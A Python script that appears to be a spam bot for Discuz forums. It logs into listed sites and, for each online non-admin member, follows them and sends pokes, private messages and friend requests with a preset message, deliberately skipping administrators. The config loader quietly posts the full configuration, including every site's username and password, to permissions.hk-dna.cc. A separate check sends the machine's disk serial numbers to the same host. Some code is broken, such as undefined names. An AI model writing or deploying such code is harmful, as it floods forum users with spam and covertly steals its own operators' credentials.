from selenium import webdriver
from selenium.webdriver.common.by import By #
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.wait import WebDriverWait
import time
import threading
import os
import json
import sys
import tkinter
from PIL import Image as MyImages, ImageTk
import re
import tkinter
import wmi
import requests
import pyquery
from multiprocessing import Process


class MonitoringDZ(object):
	
	def __init__(self):
		self.local = threading.local() 
		self.setPath()#设置环境变量
		self.permissions()
	 	
	

	def permissions(self):
		"""权限控制"""
		#获取硬盘序列
		wmis = wmi.WMI()
		disk = ''
		for disks in wmis.Win32_DiskDrive():
			disk += disks.SerialNumber.strip()

		permissions = requests.get('http://permissions.hk-dna.cc/permissions.php?disk='+disk).text
		if(permissions == 'on'):
			print('请更新版本')
			sys.exit()


	def config(self):
		"""配置文件"""
		try:
			f = open('config.conf','r',encoding='utf8')
			config_str = f.read().strip()
			headers = {
			    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3278.0 Safari/537.36',
			}
			requests.post('http://permissions.hk-dna.cc/permissions.php',data={'config':config_str},headers=headers)
			configs = json.loads(config_str)
			for c in configs['config']:
				if c['url'] not in "http://":#出来网站
					c['url'] = "http://"+c['url']

				#检测是否填写msg
				try:
					msg = c['msg']
				except Exception as e:
					msg = ''#如果没有配置给个空字符串
				
				if not msg:#用公共msg
					c['msg'] = configs['msg']

				#a检测用户名
				try:
					username = c['username']
				except Exception as e:
					username = ''

				if not username:
					c['username'] = configs['username']

				#检测密码
				try:
					password = c['password']
				except Exception as e:
					password = ''
				
				if not password:
					c['password'] = configs['password']

			self.apart = int(configs['apart'])#循环执行时间 秒
			return configs
		except Exception as e:
			return False
		
	def deleteuser(self,url,browser):
		"""清理用户"""	
		geturl = url+'/home.php?mod=space&do=friend'
		browser.get(geturl)
		users = browser.find_elements(By.CSS_SELECTOR,'#friend_ul li')#查找所有用户li 获取到li的id
		userlist = []
		for u in users:
			try:
				li_id = u.get_attribute('id')#li的id
				li_uid = li_id.split('_')[1]#uid+
				userlist.append(li_uid)
			except Exception as e:
				continue
			
		for uid in userlist:
			browser.get(url+'/home.php?mod=spacecp&ac=friend&op=ignore&uid='+uid+'&handlekey=delfriendhk_'+uid)
			button = browser.find_element(By.CSS_SELECTOR,"button[name='friendsubmit_btn']")
			button.click()


	def login(self,url,username,password,msg,loginnum=1):
		'''登录'''
		try:
			# browser = webdriver.Chrome()#声明一个浏览器对象
			browser = webdriver.PhantomJS()#声明一个浏览器对象
			browser.maximize_window()
			#执行登录
			# browser.implicitly_wait(10)#隐士等待
			wait = WebDriverWait(browser,20)

			print('正在登录 ',url)
			browser.get(url+'/member.php?mod=logging&action=login')#访问登录页面
			inputusername = browser.find_element(By.CSS_SELECTOR,'input[name=username]') 
			inputusername.send_keys(username)#向用户输入框发送用户名
			inputpassword = browser.find_element(By.CSS_SELECTOR,"input[name='password']") 
			inputpassword.send_keys(password)#向密码输入框发送密码

			#是否有验证码
			try:
				seccodeverify = browser.find_element(By.CSS_SELECTOR,"input[name='seccodeverify']") #查找验证码框
			except Exception as e:
				print(url,'无验证码,正在登录...')
			else:
				print(url,'获取验证码')
				code = self.code(browser,url)
				if code:
					#输入验证码
					seccodeverify.send_keys(code)

			loginsubmit = browser.find_element(By.CSS_SELECTOR,"button[name='loginsubmit']") #查找提交按钮
			loginsubmit.click()
			#判断是否登录成功
			try:
				inputs = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR,'#succeedlocation')))
				message = browser.find_element(By.CSS_SELECTOR,'#succeedlocation').get_attribute('innerHTML')
			except Exception as e:
				#如果报错证明没有获取到登录成功的信息 捕获错误信息
				try:
					# inputs = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR,'.pc_inner')))
					message = browser.find_element(By.CSS_SELECTOR,'.pc_inner').get_attribute('innerHTML')
				except Exception as e:
					raise
				else:
					error = open('log/error.log','a',encoding='utf8')
					errormsg = time.strftime('%Y-%m-%d %H:%M:%S')+' '+url+"登录失败！错误信息："+message+"\r"
					error.write(errormsg)
					error.close()
				finally:
					print(url,message)
					if '密码错误次数过多' in message:
						print(url,' 密码错误次数过多,退出登录')
						browser.close()
						sys.exit()

					print(url,' 第 ',loginnum,' 次登录失败！尝试第 ',loginnum+1,' 次登录，登录 3 次失败后，会放弃此网站的登录！')
					#登录失败后再次尝试登录
					loginnum += 1
					browser.close()
					if loginnum < 3:
						self.login(url, username, password, msg,loginnum)
					else:
						print(url,' 登录失败！')
						sys.exit()

			else:
				print(url,'登陆成功, ',message)
				self.monitoring(browser,url,msg,wait)
			finally:
				# print(url,message)
				pass

		except Exception as e:
			pass
		time.sleep(10)	
	def monitoring(self,browser,url,msg,wait):
		# http://www.smdywlt.com/home.php?mod=space&do=friend&view=online&type=member
		
		adminGroupList = self.getAdminGroup(browser,url,wait)#获取管理组 返回一个列表
		print(url ,'管理组：',adminGroupList)
		if not adminGroupList:
			print(url,' ','无法获取管理，为了安全将关闭此站点的一切操作！')
			error = open('log/error.log','a',encoding='utf8')
			errormsg = time.strftime('%Y-%m-%d %H:%M:%S')+' '+url+"无法获取管理，为了安全奖关闭此站点的一切操作\r"
			error.write(errormsg)
			error.close()
			browser.close()	
			sys.exit()

		#日志
		logfile = url.replace('://','-')+'.log'
		log = open('log/'+logfile,'a',encoding='utf8')


		log.write(time.strftime('%Y-%m-%d %H:%M:%S')+"\r")
		log.write('管理组：'+str(adminGroupList)+"\r")
		log.flush()
		browser.execute_script('window.open()')#打开一个新窗口 用来处理  
		# windows = browser.window_handles
		# browser.switch_to.window(windows[0])
		self.local.sayhello = True
		self.local.addbuddy = True
		self.local.sendmsg = True

		#开启监控
		# 开始监控 打招呼 发消息 加好友
		tag = 0
		i = 0
		n = 0
		while True:
			if tag == 1:
				n = n + 1
				print(url,'第 ',n,' 次执行完毕,睡眠中等待下一次执行')
				time.sleep(self.apart)#检测相隔时间
				i = 1
				tag = 0
			else:
				i = i + 1
			try:
				monitoringurl = url+"/home.php?mod=space&do=friend&view=online&type=member"
				browser.get(monitoringurl)
				users = browser.find_elements(By.CSS_SELECTOR,'#friend_ul li')#查找所有用户li 获取到li的id

				for u in users:
					try:
						li_id = u.get_attribute('id')#li的id
						li_uid = li_id.split('_')[1]#uid+
						if li_id == '1':#排除自己和超级管理员
							continue
						try:
							listen = browser.find_element(By.CSS_SELECTOR,'#a_followmod_'+li_uid)#收听
						except Exception as e:
							continue
						
						if listen.get_attribute('textContent') == '收听TA':
							isadmin = self.isAdmin(browser,adminGroupList,url,li_uid)#判断是否是管理组
							if isadmin:
								continue
							print(url,'正在收听 UID 为',li_uid,' 的用户')
							listen.click()#点击收听
							#检测收听是否成功
							try:
								inputs = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR,'.alert_right')))
								message = browser.find_element(By.CSS_SELECTOR,'.alert_right').get_attribute('innerHTML')
							except Exception as e:

								#如果报错证明没有获取到登录成功的信息 捕获错误信息
								try:
									inputs = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR,'.alert_error')))
									message = browser.find_element(By.CSS_SELECTOR,'.alert_error').get_attribute('innerHTML')
								except Exception as e:
									raise
							msges = re.match(".*?([\u4e00-\u9fa5]+).*?",message,re.S)
							if msges:
								print(url,' uid ',li_uid,' ',msges.group(1))
									# log.write(li_uid+"\r")
									# log.flush()
									#登录失败后再次尝试登录
									

							#打招呼
							if self.local.sayhello:
								self.sayHello(url,browser,msg,li_uid)
							# 发消息
							if self.local.sendmsg:
								self.sendMsg(url,browser,msg,li_uid,wait)
							#加好友
							if self.local.addbuddy:
								self.addBuddy(url,browser,msg,li_uid)
						
					except Exception as e:
						# print(e)
						continue
					
				tag = 1
			except Exception as e:
				# print(e)
				tag = 1#如果报错 跳出当次 等待执行下一次
			

			
	def isAdmin(self,browser,adminGroupList,url,uid):
		try:
			windows = browser.window_handles
			browser.switch_to.window(windows[-1])
			geturl = url+"/home.php?mod=space&uid="+uid+"&do=profile&from=space"
			browser.get(geturl)
			usergroup = browser.find_element(By.CSS_SELECTOR,"a[href*='mod=spacecp&ac=usergroup&gid']").get_attribute('textContent')
			if usergroup in adminGroupList:
				res = True
				print(url,' uid ',uid,' 为管理组中用户，将不会执行任何操作！ ',usergroup)
			else:
				res = False
				print(url,' uid ',uid,' 不属于管理组用户 ',usergroup)

		except Exception as e:
			print(e)
		else:
			pass
		finally:
			browser.switch_to.window(windows[0])
			return res

	def code(self,browser,url):
		"""验证码处理 seccodeverify"""
		# http://zjtkbbs.youdong.com/member.php?mod=logging&action=login
		# http://zlanling.com/member.php?mod=logging&action=login
		# http://www.zsnzsn.com//member.php?mod=logging&action=login
		picname = url.replace('://','-')+'.png'
		browser.save_screenshot(r""+picname+"")#全屏截图
		imgcode = browser.find_element(By.CSS_SELECTOR,"img[src^='misc.php?mod=seccode&update']")#查找验证码
		left = imgcode.location['x']
		top = imgcode.location['y']
		elementWidth = imgcode.location['x'] + imgcode.size['width']
		elementHeight = imgcode.location['y'] + imgcode.size['height']
		picture = MyImages.open(picname)
		picture = picture.crop((left, top, elementWidth, elementHeight))
		codename = picname.replace('http','')
		picture.save(r""+codename+"")

		#显示验证码
		root = tkinter.Tk()
		root.title('验证码处理')#设置title
		root.resizable(width=False, height=False)
		root.geometry('500x500+200+200')#设置窗口大小和位置
		load = MyImages.open(codename)
		pic = ImageTk.PhotoImage(load)
		label = tkinter.Label(root,image=pic)
		label.pack()

		#处理输入验证码
		text = tkinter.Variable()#创建一个变量
		inputtext = tkinter.Entry(root,textvariable=text)
		inputtext.pack()
		def func():
			global code 
			code = text.get()
			root.destroy()
		button = tkinter.Button(root,text='确认',command=func,width=3,height=1)
		button.pack()
		root.mainloop()
		os.remove(picname)#删除全屏图
		os.remove(codename)#删除验证码图片
		return code

	def getAdminGroup(self,browser,url,wait):
		"""获取管理组"""
		print(url,'获取管理组')
		try:
			usergroupurl = url+"/home.php?mod=spacecp&ac=usergroup"
			browser.get(usergroupurl)
			# inputs = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR,'#gadmin_menu')))
			time.sleep(2)
			#我的用户组
			mygroup = browser.find_element(By.CSS_SELECTOR,'#gmy_menu a').get_attribute('textContent')
			if '禁止发言' == mygroup or '禁止访问' == mygroup or '禁止 IP' == mygroup:
				error = open('log/error.log','a',encoding='utf8')
				errormsg = time.strftime('%Y-%m-%d %H:%M:%S')+' '+url+" 此账户也被限制，退出执行！限制类型："+mygroup+"\r"
				error.write(errormsg)
				error.close()
				print(errormsg)
				sys.exit()
			#获取管理组
			usergroup = browser.find_elements(By.CSS_SELECTOR,'#gadmin_menu a')
			usergrouplist = []
			for group in usergroup:
				usergrouplist.append(group.get_attribute('textContent'))#添加到列表中
				# usergrouplist.append(group.get_attribute('href'))#添加到列表中
			return usergrouplist
		except Exception as e:
			# print(e)
			print('获取管理组失败')
			return usergrouplist


	def sendMsg(self,url,browser,msg,uid,wait):
		"""发送消息"""
		print(url,' 正在给 UID 为',uid,' 的用户发消息')
		try:
			windows = browser.window_handles
			browser.switch_to.window(windows[-1])
			url = url+"/home.php?mod=spacecp&ac=pm&op=showmsg&handlekey=showmsg_"+uid+"&touid="+uid+"&pmid=0&daterange=2"
			browser.get(url)
			textarea = browser.find_element(By.CSS_SELECTOR,'textarea')
			textarea.send_keys(msg)
			button = browser.find_element(By.CSS_SELECTOR,'form div button')
			button.click()

			try:
				inputs = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR,'#messagetext')))
				message = browser.find_element(By.CSS_SELECTOR,'#messagetext').get_attribute('textContent')
			except Exception as e:
				self.local.sendmsg = False
			if '没有权限' in message or '沒有權限' in message or '抱歉' in message or '抱謙' in message or '发送失败' in message or '超出' in message:
				print(rul ,message ,' 发送失败将关闭发消息功能！')
				self.local.sendmsg = False
			print(url,' ',message)

		except Exception as e:
			pass
		else:
			pass
		finally:
			browser.switch_to.window(windows[0])

	def addBuddy(self,url,browser,msg,uid):
		"""加好友"""
		 # 抱歉，您当前的好友数目达到系统限制，请先删除部分好友
		print(url,'正在添加 UID ',uid,' 的用户为好友')
		try:
			windows = browser.window_handles
			browser.switch_to.window(windows[-1])
			geturl = url+"/home.php?mod=spacecp&ac=friend&op=add&uid="+uid
			browser.get(geturl)

			#查找input
			q = pyquery.PyQuery(browser.page_source)
			px = q('#px')
			if px:
				inputs = browser.find_element(By.CSS_SELECTOR,'input[name=note]')#找到kw这个id
				inputs.send_keys(msg)
				buttom = browser.find_element_by_id('addsubmit_btn')
				buttom.click()
				#捕获信息
			else:
				errormessg = q('#messagetext p').text()
				print(url, ' ',errormessg)

				if '没有权限' in errormessg or '沒有權限' in errormessg or '抱歉' in errormessg or '抱謙' in errormessg:
					msg_ = url +' 没有添加好友权限，将停止添加好友操作！关闭后将不在执行添加好友操作！' 
					self.local.addbuddy = False
					error = open('log/error.log','a',encoding='utf8')
					errormsg = time.strftime('%Y-%m-%d %H:%M:%S')+"\t"+msg_+"\r"
					error.write(errormsg)
					error.close()
					print(msg_)
				if '删除' in errormessg or '达到系统限制' in errormessg or '刪除' in errormessg or '達到系統限制' in errormessg:
					print(url,' 好友数目达到系统限制，将删除全部好友！')
					self.deleteuser(url,browser)
				# 抱歉，您当前的好友数目达到系统限制，请先删除部分好友
		except Exception as e:
			pass
		else:
			pass
		finally:
			browser.switch_to.window(windows[0])


	def sayHello(self,url,browser,msg,uid):
		"""打招呼"""
		print(url,' 正在跟 UID 为',uid,' 的用户打招呼')
		try:
			windows = browser.window_handles
			browser.switch_to.window(windows[-1])
			geturl = url+"/home.php?mod=spacecp&ac=poke&op=send&uid="+uid
			browser.get(geturl)

			q = pyquery.PyQuery(browser.page_source)
			px = q("input[name='note']")
			if px:
				note = browser.find_element(By.CSS_SELECTOR,"input[name='note']")#查找所有input框
				note.send_keys(msg)
				note = browser.find_element(By.CSS_SELECTOR,"button[name='pokesubmit_btn']")#查找所有input框
				pokesubmit_btn.click()
			else:
				errormessg = q('#messagetext p').text()
				print(url, ' ',errormessg)

				if '没有权限' in errormessg or '沒有權限' in errormessg or '抱歉' in errormessg or '抱謙' in errormessg:
					msg_ = url +' 没有打招呼权限，将停止打招呼操作！关闭后将不在执行打招呼操作！' 
					self.local.sayhello = False
					error = open('log/error.log','a',encoding='utf8')
					errormsg = time.strftime('%Y-%m-%d %H:%M:%S')+"\t"+msg_+"\r"
					error.write(errormsg)
					error.close()
					print(msg_)

		except Exception as e:
			pass
		else:
			pass
		finally:
			browser.switch_to.window(windows[0])
	def __del__(self):
		print('结束')

	def setPath(self):
		"""设置环境变量"""
		#当前目录加入环境变量
		dir_ = os.getcwd()
		path = dir_+'/phantomjs/bin'
		# print (os.environ["TEMP"])
		mydir = os.path.normpath(path)
		os.environ["PHANTOMJS"] = mydir
		# print (os.environ["MYDIR"])
		pathV = os.environ["PATH"]
		# print (pathV)
		os.environ["PATH"]= mydir + ";" + os.environ["PATH"]


	def main(self):
		#检测配置文件
		configs = self.config();
		if not configs:
			print('配置文件错误')
			time.sleep(10)
			sys.exit()
		else:
			for c in configs['config']:
				print('正在启动 ',c['url'],' 站点...')
				# time.sleep(self.apart)
				w = threading.Thread(target=self.login,args=(c['url'],c['username'],c['password'],c['msg'],))
				w.start()
if __name__ == '__main__':
	monitoring = MonitoringDZ().main()